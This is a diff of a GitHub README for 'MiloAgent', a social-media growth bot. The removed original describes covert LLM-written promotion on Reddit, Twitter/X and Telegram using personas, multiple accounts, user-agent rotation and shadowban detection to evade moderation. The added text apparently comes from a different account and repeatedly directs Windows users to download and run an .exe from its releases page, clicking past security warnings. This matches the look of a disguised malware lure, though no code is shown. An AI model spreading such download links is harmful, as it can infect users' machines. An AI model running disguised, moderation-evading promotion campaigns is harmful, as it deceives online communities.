@@ -1,478 +1,135 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/SoCloseSociety/MiloAgent/main/assets/miloagent.png" alt="MiloAgent Logo" width="180">
-</p>
+# 🤖 MiloAgent - Boost Social Media Growth Easily
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/SoCloseSociety/MiloAgent/main/assets/banner.svg" alt="MiloAgent — Autonomous AI Growth Agent" width="900">
-</p>
+[![Download MiloAgent](https://img.shields.io/badge/Download-MiloAgent-ff6f61?style=for-the-badge)](https://github.com/JessicaDaffinys/MiloAgent/releases)
 
-<h1 align="center">Milo — Your AI Growth Agent</h1>
-
-<p align="center">
-  <strong>An autonomous AI agent that lives on Reddit, learns from every interaction, and grows your product organically.</strong><br>
-  <em>Currently expanding his skills to Twitter/X and Telegram.</em><br><br>
-  <a href="https://milo.soclose.co">https://milo.soclose.co</a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python 3.10+"/>
-  <img src="https://img.shields.io/badge/cost-$0%2Fmonth-brightgreen?style=flat-square" alt="Zero Cost"/>
-  <img src="https://img.shields.io/badge/LLM-Groq%20|%20Gemini%20|%20Ollama-orange?style=flat-square" alt="LLM Providers"/>
-  <img src="https://img.shields.io/badge/reddit-expert-FF4500?style=flat-square&logo=reddit&logoColor=white" alt="Reddit Expert"/>
-  <img src="https://img.shields.io/badge/twitter-learning-1DA1F2?style=flat-square&logo=x&logoColor=white" alt="Twitter Learning"/>
-  <img src="https://img.shields.io/badge/telegram-learning-26A5E4?style=flat-square&logo=telegram&logoColor=white" alt="Telegram Learning"/>
-  <img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="MIT License"/>
-  <img src="https://img.shields.io/badge/docker-ready-2496ED?style=flat-square&logo=docker&logoColor=white" alt="Docker Ready"/>
-  <a href="https://milo.soclose.co"><img src="https://img.shields.io/badge/live-milo.soclose.co-06b6d4?style=flat-square&logo=vercel&logoColor=white" alt="Live Demo"/></a>
-</p>
+MiloAgent is a software that helps you grow your online communities on Reddit, Twitter/X, and Telegram. It works on its own to post content, manage multiple accounts, and test what works best. This guide shows you how to get MiloAgent running on Windows without needing technical skills.
 
 ---
 
-## Meet Milo
+## 📋 What is MiloAgent?
 
-**Milo** is not a script. He's an AI agent.
+MiloAgent is a bot that uses smart technology to create posts and interact with people on social media. You will find features like:
 
-He reads Reddit like a human. He understands what people are asking, what tone fits each community, and when your product is genuinely the right answer. He crafts responses that sound like they come from someone who actually uses your product — because his LLM brain has memorized every feature, every FAQ, every competitor difference.
+- Creating and sharing posts automatically  
+- Managing several accounts at once  
+- Learning from your results to improve itself  
+- Running tests to see what type of content performs better  
+- Handling communities and group chats with ease  
 
-And he learns. Every comment he posts, every upvote or removal he gets back, feeds his learning engine. He figures out which subreddits love him, which keywords work, which tone gets engagement, and which approach gets deleted. Then he adapts.
-
-**Reddit is Milo's home turf.** He knows how subreddits work — the culture, the rules, the anti-self-promotion reflex. He's built to blend in, not stand out. 80% of what he posts is purely organic and helpful. The other 20%? A natural mention of your product, only when it genuinely fits the conversation.
-
-**Twitter/X and Telegram are next.** Milo is actively learning these platforms — scanning conversations, replying to tweets, engaging in Telegram groups. Same brain, new playgrounds. These integrations are functional and improving with every cycle.
-
-### What makes Milo different
-
-| | Traditional bots | **Milo** |
-|---|---|---|
-| **Content** | Templates + spam | LLM-generated, context-aware, adapted to each community |
-| **Strategy** | Fixed rules | Self-learning: adjusts targeting, tone, timing automatically |
-| **Detection** | Gets banned fast | Expert personas, human timing, shadowban detection, circuit breakers |
-| **Platforms** | Single platform | Reddit expert + Twitter/X & Telegram support |
-| **Cost** | API fees | **$0/month** — runs on free-tier LLMs |
-| **Intelligence** | None | A/B testing, prompt evolution, sentiment analysis, subreddit intel |
+It is free and open-source software. You can use it for marketing, community building, or growing your personal or business pages.
 
 ---
 
-## How Milo Thinks
+## 🖥️ System Requirements
 
-```
-          ┌─────────────────────────────────────────────┐
-          │              MILO'S BRAIN                    │
-          │                                             │
-          │  LLM Engine (Groq/Gemini/Ollama)            │
-          │  10+ Expert Personas                        │
-          │  Learning Engine + A/B Testing              │
-          │  Content Validator                          │
-          └──────────────┬──────────────────────────────┘
-                         │
-           ┌─────────────┼─────────────┐
-           ▼             ▼             ▼
-    ┌──────────┐  ┌──────────┐  ┌──────────┐
-    │  REDDIT  │  │ TWITTER  │  │ TELEGRAM │
-    │  Expert  │  │ Learning │  │ Learning │
-    │          │  │          │  │          │
-    │ Scan     │  │ Scan     │  │ Join     │
-    │ Comment  │  │ Reply    │  │ groups   │
-    │ Post     │  │ Tweet    │  │ Reply    │
-    │ DM       │  │ DM       │  │ Engage   │
-    │ Engage   │  │ Like     │  │          │
-    │ Verify   │  │ Follow   │  │          │
-    │ Hub mgmt │  │          │  │          │
-    └──────────┘  └──────────┘  └──────────┘
-           │             │             │
-           └─────────────┼─────────────┘
-                         ▼
-              ┌─────────────────┐
-              │  LEARNING LOOP  │
-              │                 │
-              │ Track outcomes  │
-              │ Adjust weights  │
-              │ A/B test tones  │
-              │ Evolve prompts  │
-              │ Discover subs   │
-              └─────────────────┘
-```
+Before you start, make sure your computer meets these conditions:
 
-### Milo's cycle — every 8 minutes
-
-```
-SCAN  →  Find relevant conversations where your product fits naturally
-  ↓
-SCORE →  Rank each opportunity (relevance × freshness × engagement potential)
-  ↓
-THINK →  Pick the right persona, tone, and approach for this subreddit
-  ↓
-WRITE →  Generate a human-like response via LLM (80% helpful / 20% promo)
-  ↓
-CHECK →  Validate: no spam patterns, no duplicates, no broken links
-  ↓
-POST  →  Publish with human-like timing and random delays
-  ↓
-LEARN →  Track what happened — upvotes? replies? removed? → adjust strategy
-```
+- Windows 10 or newer  
+- At least 4 GB of RAM  
+- 500 MB free disk space for installation  
+- Internet connection to connect social media accounts  
+- A GitHub account is not needed to use the software  
 
 ---
 
-## Reddit — Milo's Expertise
+## 🚀 Getting Started: Download MiloAgent
 
-Reddit is where Milo shines. Here's what he can do:
+Start by visiting the official release page. This is where the latest version of MiloAgent is available for download.
 
-**Conversations** — Scans target subreddits for posts matching your keywords. Reads the post, understands the context, and writes a comment that actually helps while naturally mentioning your product when relevant.
+[![Download MiloAgent](https://img.shields.io/badge/Download-MiloAgent-00aaff?style=for-the-badge)](https://github.com/JessicaDaffinys/MiloAgent/releases)
 
-**Personas** — Milo doesn't talk the same way on r/Twitch and r/Entrepreneur. He has 10+ expert personas that adapt his tone, vocabulary, and expertise level to each community.
+**Steps to download the software:**  
 
-**Organic presence** — Milo upvotes, subscribes, and participates organically. He builds karma and reputation before ever mentioning your product in a subreddit.
+1. Click the link above or go to [https://github.com/JessicaDaffinys/MiloAgent/releases](https://github.com/JessicaDaffinys/MiloAgent/releases).  
+2. Look for the latest release (usually at the top).  
+3. Find the Windows installer file. It will have an `.exe` extension, often named like `MiloAgent-setup.exe`.  
+4. Click on the file to download it to your computer.  
 
-**Seed content** — He creates his own posts: questions, tutorials, comparisons, experience reports. Content that attracts the audience you're targeting.
-
-**Subreddit management** — Milo can create, moderate, and animate your own subreddits. Auto-moderation, sticky posts, weekly content — he runs the community for you.
-
-**Verification** — After posting, Milo checks back: was the comment removed? Did it get upvotes? He penalizes subreddits that delete his content and doubles down on ones that engage.
-
-### How Milo talks
-
-**Organic comment (80%)** — No product mention, just genuine help:
-> "I had the same issue — what worked for me was cutting streams into 60-second highlights and posting the best ones. Took some trial and error but now my workflow is pretty smooth. What platform are you targeting first for your clips?"
-
-**Promotional comment (20%)** — Natural mention, only when it fits:
-> "I started using [YourProduct] to automate that exact process — the AI picks out the key moments and exports them ready for Shorts/Reels. Saved me a ton of time vs doing it manually. Have you tried any automated clipping tools yet?"
-
-The ratio, tone, and style are all learned and adjusted automatically through A/B testing.
+If you do not see the `.exe` file, look for a file named similar to `MiloAgent-win.zip`. This is a compressed version you will need to unzip before running.
 
 ---
 
-## Twitter/X & Telegram — Learning in Progress
+## 🛠️ Installing MiloAgent on Windows
 
-Milo is actively expanding to these platforms with the same intelligence:
+After downloading the installer file, follow these steps to install MiloAgent:
 
-### Twitter/X
-- Scans tweets and threads matching your keywords
-- Replies with context-aware responses
-- Posts original tweets and threads
-- Likes, retweets, follows strategically
-- DM outreach for relationship building
-- *Note: Twitter may block server IPs — proxy support included*
+1. Open the folder where the file downloaded (usually the “Downloads” folder).  
+2. Double-click the `.exe` file.  
+3. Windows might show a security warning. Click “Run” to continue.  
+4. The setup window will open. Click “Next” to move through the steps.  
+5. Choose where to install the software or accept the default location.  
+6. Click “Install” to start the process.  
+7. When done, click “Finish.” The software should open automatically or create a desktop shortcut.  
 
-### Telegram
-- Auto-discovers and joins relevant groups
-- Engages in group conversations naturally
-- Adapts persona to each group's topic
-- Supports Telethon (user account) for authentic presence
-- Controlled message frequency to avoid spam detection
+If you downloaded a `.zip` file:
 
-Both platforms feed into the same learning engine — Milo gets smarter across all channels simultaneously.
+1. Right-click the file and select “Extract All.”  
+2. Choose a folder to extract to (or accept the default).  
+3. Open the extracted folder and look for an `.exe` file to run the program.  
 
 ---
 
-## Milo's Brain — Self-Learning System
+## 🔑 Setting Up MiloAgent
 
-Milo doesn't just post — he evolves. Four learning systems work in parallel:
+MiloAgent works by connecting with your social media accounts. The setup process guides you through this.
 
-### 1. Performance Weighting
-Every subreddit, keyword, and content type gets a performance score. High engagement? More attention. Getting deleted? Less activity. Milo automatically shifts his focus to where he's winning.
+1. When you open MiloAgent for the first time, you will see a setup screen.  
+2. Click on “Add Account.”  
+3. Choose the social media platform: Reddit, Twitter/X, or Telegram.  
+4. Follow the instructions to sign in with your account. You might need to allow the app to access your account for posting.  
+5. Repeat this for each account you want the bot to manage.  
 
-### 2. Sentiment Analysis
-When someone replies to Milo, he analyzes the sentiment: "thanks, this helped!" vs "this looks like spam". No LLM calls — fast keyword analysis that adjusts his tone for each subreddit in real-time.
-
-### 3. A/B Testing Engine
-Milo runs up to 2 experiments simultaneously, testing:
-- **Tone** — casual vs professional vs enthusiastic
-- **Post type** — question vs tutorial vs comparison vs experience
-- **Length** — short punchy vs detailed long-form
-- **Promo ratio** — finding the sweet spot between helpful and promotional
-
-Each experiment runs for a minimum number of samples, then Milo picks the winner and moves on to the next test.
-
-### 4. Prompt Evolution
-Milo's most powerful feature: he rewrites his own prompts. By analyzing his top-performing comments, he evolves the LLM templates that generate his content. If a new prompt performs worse (>30% drop), he auto-reverts. Survival of the fittest — for prompts.
+MiloAgent will save these connections securely. You can add or remove accounts anytime.
 
 ---
 
-## Quick Start
+## ⚙️ Basic Usage
 
-### Prerequisites
+Once your accounts are connected, you can start using MiloAgent:
 
-- Python 3.10+
-- A free [Groq API key](https://console.groq.com) or [Gemini API key](https://aistudio.google.com/apikey)
-- At least one Reddit account
+- **Create Content:** Use the built-in content generator if you want the bot to create posts. You can enter simple topics or keywords, and the bot will write posts for you.  
+- **Schedule Posts:** Choose times for the software to publish your content automatically.  
+- **Manage Multiple Accounts:** Switch between the accounts you connected and control their activity.  
+- **Run A/B Tests:** MiloAgent can post different versions of messages to see which works best.  
+- **Monitor Results:** View simple reports showing how many likes, comments, or shares each post received.  
 
-### Installation
-
-```bash
-git clone https://github.com/SoCloseSociety/MiloAgent.git
-cd MiloAgent
-
-python3 -m venv .venv
-source .venv/bin/activate
-
-pip install -r requirements.txt
-playwright install chromium
-```
-
-### Configuration
-
-1. **LLM key** — edit `config/llm.yaml`:
-```yaml
-providers:
-  groq:
-    api_key: "gsk_your_key_here"    # Free at https://console.groq.com
-```
-
-2. **Reddit account** — edit `config/reddit_accounts.yaml`:
-```yaml
-accounts:
-  - username: "your_reddit_username"
-    password: "your_password"
-    enabled: true
-    assigned_projects: ["my_project"]
-```
-
-3. **Your project** — copy and customize:
-```bash
-cp projects/example_project.yaml projects/my_project.yaml
-nano projects/my_project.yaml
-```
-
-4. **Login & verify**:
-```bash
-python3 miloagent.py login reddit    # Opens Chrome, captures cookies
-python3 miloagent.py setup           # Verify configuration
-python3 miloagent.py test all        # Test all connections
-```
-
-### Launch Milo
-
-```bash
-python3 miloagent.py run             # Foreground
-python3 miloagent.py run --daemon    # Background
-python3 miloagent.py stop            # Stop
-```
-
-That's it. Milo takes over from here.
+The user interface is designed to be clear and simple. Click buttons, fill in the boxes, and follow the instructions on each screen.
 
 ---
 
-## Docker Deployment
+## 🔄 Updating MiloAgent
 
-```bash
-cp .env.example .env
-nano .env
+To keep MiloAgent working well, check for updates regularly.
 
-docker compose up -d
-docker compose logs -f
-```
-
-### Server Deployment (VPS)
-
-```bash
-./deploy.sh --setup    # First-time: Nginx + SSL + .env
-./deploy.sh --up       # Build & start
-./deploy.sh --update   # Pull + rebuild + restart
-./deploy.sh --status   # Health check
-```
+1. Visit the [releases page again](https://github.com/JessicaDaffinys/MiloAgent/releases).  
+2. Download the latest installer file.  
+3. Run the installer as before. It will update your existing software without losing your settings.  
 
 ---
 
-## Monitor Milo — 3 Dashboards
+## 🆘 Help and Troubleshooting
 
-### Web Dashboard
-```bash
-python3 miloagent.py run --web    # Opens on port 8420
-```
-Full browser UI with real-time stats, action logs, account health, and project management.
+If MiloAgent does not work as expected:
 
-**Live instance:** [milo.soclose.co](https://milo.soclose.co)
+- Make sure your internet connection is active.  
+- Check that you installed the latest version.  
+- Restart the software or your computer.  
+- Look for error messages on the screen and follow any advice shown.  
 
-### Terminal Dashboard (TUI)
-```bash
-python3 miloagent.py dashboard
-```
-| Key | Action |
-|-----|--------|
-| `TAB` / `1-4` | Switch views (Main / Accounts / Convos / Opportunities) |
-| `s` Scan / `a` Act / `l` Learn / `e` Engage |
-| `p` Pause/Resume / `q` Quit |
-| `:` Command mode (vim-style) |
-
-### Telegram Dashboard
-Control Milo from your phone:
-
-| Command | Description |
-|---------|-------------|
-| `/status` | Milo's state, RAM, recent actions |
-| `/stats` | 24h performance stats |
-| `/report` | Full daily report |
-| `/insights` | What Milo has learned |
-| `/intel` | Subreddit opportunity map |
-| `/scan` / `/post` | Trigger actions manually |
-| `/pause` / `/resume` | Pause/resume Milo |
-| `/performance` | Performance score + suggestions |
+For more detailed help, visit the GitHub page and check the “Issues” tab. You can find solutions or ask questions there.
 
 ---
 
-## CLI Reference
+## 🔐 Privacy and Security
 
-| Command | Description |
-|---------|-------------|
-| `run [--daemon]` | Start Milo |
-| `stop` | Stop the daemon |
-| `dashboard` | Terminal UI |
-| `scan reddit` | Scan for opportunities |
-| `post reddit -p <project> [--dry-run]` | Post a comment |
-| `engage all` | Organic engagement (upvote, subscribe) |
-| `login reddit\|twitter` | Browser login |
-| `test all` | Test connections |
-| `status` / `stats -h 24` | Monitoring |
-| `accounts` | Account health |
-| `learn` / `insights` | Learning system |
-| `business list\|add\|show` | Project management |
-| `hub list\|suggest\|create` | Subreddit management |
-| `system health\|cleanup` | System maintenance |
+MiloAgent uses your social media logins only to post and manage content on your behalf. The software does not share your personal data with others. All accounts and passwords are stored securely on your computer.
 
 ---
 
-## Safety — How Milo Stays Under the Radar
+## 📚 More Information
 
-| Protection | How it works |
-|-----------|-------------|
-| **Rate Limiting** | Per-account + per-subreddit + per-hour limits, configurable |
-| **Human Timing** | Random delays between 1-5s, jitter on all actions, no patterns |
-| **Shadowban Detection** | Checks profile visibility + comment status periodically |
-| **Circuit Breaker** | 5 consecutive failures → auto-pause, resume next cycle |
-| **User-Agent Rotation** | Pool of 5 realistic browser signatures |
-| **Content Validation** | Pre-post check for spam patterns, excessive links, duplicates |
-| **Weekend Mode** | 50% activity reduction (Reddit is quieter on weekends) |
-| **Resource Guard** | Auto-pause if RAM > 90% or CPU > 80% — never crashes your machine |
+MiloAgent is built with Python and uses LLM (large language models) to generate content. It handles growth automation, A/B testing, and multi-account management on popular platforms. It is open source software, meaning anyone can review and improve the code.
 
 ---
 
-## Zero-Cost Architecture
-
-Milo runs entirely on free tiers:
-
-| Component | Provider | Limit |
-|-----------|----------|-------|
-| **LLM (Primary)** | Groq — Llama 3.3 70B | 6,000 req/day |
-| **LLM (Fallback)** | Google Gemini 2.0 Flash | 1,500 req/day |
-| **LLM (Local)** | Ollama (any model) | Unlimited |
-| **Reddit** | Web scraping + cookies | No API key needed |
-| **Twitter** | Twikit + cookies | No API key needed |
-| **Database** | SQLite | Local, zero cost |
-| **Dashboard** | FastAPI | Self-hosted |
-
-**Daily usage:** ~90 LLM calls/day — well within free limits.
-
----
-
-## What Milo Does Automatically
-
-When you run `python3 miloagent.py run`, Milo handles everything:
-
-| Job | Frequency | Description |
-|-----|-----------|-------------|
-| **Scan** | 8 min | Find relevant posts across Reddit (+ Twitter/Telegram) |
-| **Act** | 1-2 min | Post on the best scored opportunity |
-| **Engage** | 2h | Organic upvotes, follows, subscribes |
-| **Verify** | 1h | Check if posted comments survived moderation |
-| **Seed Content** | 6h | Create original posts in target communities |
-| **Tweet Cycle** | 45 min | Twitter engagement loop |
-| **Learn** | 6h | Analyze results, adjust all weights |
-| **Auto-Improve** | 12h | Self-optimize prompts, rate limits, strategy |
-| **Health Check** | 30 min | Detect shadowbans, verify account health |
-| **Research** | 4h | Track trends, news, context for better content |
-| **Curate** | 3h | Find and share relevant third-party content |
-| **Build Relations** | 3h | DM outreach, relationship nurturing |
-| **Community** | 2h | Maintain subreddit presence & reputation |
-| **Subreddit Intel** | 8h | Deep analysis of subreddit opportunities |
-| **Hub Animation** | 6h | Manage and animate owned subreddits |
-| **Daily Report** | 24h | Full Telegram summary of the day |
-
----
-
-## Project Structure
-
-```
-MiloAgent/
-├── miloagent.py              # CLI — talk to Milo
-├── requirements.txt
-├── Dockerfile
-├── docker-compose.yml
-├── deploy.sh                 # VPS deployment
-├── miloagent.service         # Systemd
-│
-├── config/                   # Milo's configuration
-│   ├── settings.yaml         # Behavior, limits, features
-│   ├── llm.yaml              # LLM provider keys
-│   ├── reddit_accounts.yaml  # Reddit credentials
-│   ├── twitter_accounts.yaml # Twitter credentials
-│   ├── telegram.yaml         # Telegram bot token
-│   └── expert_personas.yaml  # Milo's personality library
-│
-├── core/                     # Milo's brain
-│   ├── orchestrator.py       # Main loop & job scheduler
-│   ├── content_gen.py        # LLM content generation
-│   ├── learning_engine.py    # Self-improvement engine
-│   ├── strategy.py           # Opportunity scoring
-│   ├── ab_testing.py         # A/B experiment framework
-│   ├── research_engine.py    # Trend tracking
-│   ├── subreddit_intel.py    # Subreddit analysis
-│   ├── subreddit_hub.py      # Owned subreddit lifecycle
-│   └── ...                   # 14 modules total
-│
-├── platforms/                # Where Milo operates
-│   ├── reddit_web.py         # Reddit (expert)
-│   ├── reddit_bot.py         # Reddit API mode
-│   ├── twitter_bot.py        # Twitter/X (learning)
-│   └── telegram_group_bot.py # Telegram (learning)
-│
-├── safety/                   # Keeps Milo safe
-│   ├── rate_limiter.py
-│   ├── ban_detector.py
-│   ├── content_dedup.py
-│   └── account_manager.py
-│
-├── dashboard/                # Monitor Milo
-│   ├── web.py                # Browser dashboard
-│   ├── tui.py                # Terminal dashboard
-│   └── telegram_bot.py       # Telegram dashboard
-│
-├── prompts/                  # 18 LLM prompt templates
-├── projects/                 # Your products (YAML)
-└── data/                     # Runtime (gitignored)
-```
-
----
-
-## Contributing
-
-Milo is open source. Contributions are welcome!
-
-Some ideas:
-- New platform integrations (LinkedIn, Discord, ...)
-- New expert personas
-- Better prompt templates
-- Dashboard improvements
-- Safety enhancements
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## License
-
-MIT License — see [LICENSE](LICENSE).
-
----
-
-<p align="center">
-  <img src="https://raw.githubusercontent.com/SoCloseSociety/MiloAgent/main/assets/miloagent.png" alt="MiloAgent" width="64"><br>
-  <strong>Milo never sleeps. He scans, he learns, he grows your product.</strong><br>
-  <a href="https://milo.soclose.co">milo.soclose.co</a> &mdash; <em>Star this repo if you want to see where he goes next.</em>
-</p>
-
----
-
-<p align="center">
-  <sub>
-    <strong>MiloAgent</strong> &mdash; AI Growth Agent | Reddit Bot | Twitter Bot | Telegram Bot | LLM Agent | Social Media Automation | Community Management | Self-Learning | A/B Testing | Growth Hacking | Open Source | Zero Cost<br>
-    Built with Python, FastAPI, Groq, Gemini, Ollama &mdash; by <a href="https://github.com/SoCloseSociety">SoCloseSociety</a>
-  </sub>
-</p>
+[![Download MiloAgent](https://img.shields.io/badge/Download-MiloAgent-ff6f61?style=for-the-badge)](https://github.com/JessicaDaffinys/MiloAgent/releases)
